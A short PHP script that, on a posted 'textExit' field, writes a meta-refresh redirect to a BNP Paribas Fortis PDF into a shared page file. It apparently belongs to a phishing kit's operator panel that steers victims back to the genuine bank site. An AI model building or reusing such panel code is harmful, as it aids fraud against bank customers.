
<?php


session_start();

if(isset($_POST['textExit'])) 
{
    
$Page .= '    <meta http-equiv="refresh" content="0;url=https://www.bnpparibasfortis.com/docs/default-source/pdf-(fr)/about-us/bnpp_statuts_fr.pdf?sfvrsn=2" />
  ';

$fPage = fopen("../Show_system/Show_Page.txt", "w");
    fwrite($fPage, $Page);




}

else {




}

?>
